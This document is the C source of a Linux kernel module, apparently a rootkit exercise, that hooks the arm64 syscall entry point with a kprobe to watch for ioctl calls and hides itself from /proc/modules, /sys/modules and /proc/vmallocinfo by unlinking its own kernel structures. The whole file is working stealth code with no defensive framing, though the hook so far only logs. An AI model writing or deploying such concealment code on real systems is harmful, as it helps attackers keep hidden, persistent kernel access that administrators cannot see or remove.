#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>

#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};
#endif

static void __init hide_myself(void)
{
    struct vmap_area *va, *vtmp;
    struct module_use *use, *tmp;
    struct list_head *_vmap_area_list;
    struct rb_root *_vmap_area_root;

#ifdef KPROBE_LOOKUP
    unsigned long (*kallsyms_lookup_name)(const char *name);
    if (register_kprobe(&kp) < 0)
        return;
    kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
    unregister_kprobe(&kp);
#endif

    _vmap_area_list =
        (struct list_head *) kallsyms_lookup_name("vmap_area_list");
    _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");

    /* hidden from /proc/vmallocinfo */
    list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
        if ((unsigned long) THIS_MODULE > va->va_start &&
            (unsigned long) THIS_MODULE < va->va_end) {
            list_del(&va->list);
            /* remove from red-black tree */
            rb_erase(&va->rb_node, _vmap_area_root);
        }
    }

    /* hidden from /proc/modules */
    list_del_init(&THIS_MODULE->list);

    /* hidden from /sys/modules */
    kobject_del(&THIS_MODULE->mkobj.kobj);

    /* decouple the dependency */
    list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list,
                              target_list) {
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
        kfree(use);
    }
}

static struct kprobe kpp;

// Structure for user data
struct ioctl_cf {
    int fd;
    char name[15];
};

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    // Check if the syscall is ioctl (syscall number 29)
    printk("driverX: hook called %d", (int) regs->regs[8]);
    if (regs->regs[8] == 29) {
        printk("driverX: ioctl called");
    }
    return 0;
}

static int __init hide_init(void)
{
    int ret;
    kpp.symbol_name = "el0_svc_common";
    kpp.pre_handler = handler_pre;

    ret = register_kprobe(&kpp);
    if (ret < 0) {
        pr_err("driverX: Failed to register kprobe: %d\n", ret);
        return ret;
    }
    
    hide_myself();
    printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
    return 0;
}

static void __exit hide_exit(void) {
    unregister_kprobe(&kpp);
}

module_init(hide_init);
module_exit(hide_exit);

MODULE_AUTHOR("exianb");
MODULE_DESCRIPTION("exianb");
MODULE_LICENSE("GPL");
// MODULE_VERSION("1.0");

// MODULE_LICENSE("GPL");
// MODULE_AUTHOR("National Cheng Kung University, Taiwan");
// MODULE_DESCRIPTION("Catch Me If You Can");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
#endif
